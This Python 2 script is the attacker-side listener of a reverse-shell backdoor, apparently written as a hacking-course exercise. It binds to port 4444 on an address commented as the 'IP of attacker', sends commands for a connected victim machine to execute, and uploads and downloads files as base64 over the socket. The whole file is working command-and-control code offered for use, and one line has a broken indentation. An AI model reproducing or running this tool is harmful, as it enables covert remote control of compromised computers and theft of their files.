#!/usr/bin/env python

# python2

import socket, json
import base64

class Listener:
    def __init__(self,ip,port):
        # to listen to incoming connection
        lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # to change option to reuse socket to establish new connection
        lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # bind socket to computer
        lis.bind((ip, port))
        # number of connection to queue before reject
        lis.listen(0)
        print("[+] waiting for incoming connection")
        self.connection, addr = lis.accept()
        print("[+] got a connection from" + str(addr))

    def rel_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def rel_rec(self):
        json_data = ""
        while True:
            try:
               json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def exec_rem(self,cmd):
        self.rel_send(cmd)
        if cmd[0] == "exit":
            self.connection.close()
            exit()

        return self.rel_rec()

    def writ_file(self,path,content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def run(self):
        while True:
            try:
                cmd = raw_input(">>")
                cmd=cmd.split(" ")
                if cmd[0] == "upload":
                    file_content=self.read_file(cmd[1])
                    cmd.append(file_content)
                rslt = self.exec_rem(cmd)
                if cmd[0] == "download" and "[-] Error" not in rslt:
                    rslt=self.writ_file(cmd[1], rslt)
            except Exception:
                rslt="[-] Error during execution!"
            print(rslt)
#IP of attacker,port
mylist = Listener("192.168.1.22", 4444)
mylist.run()
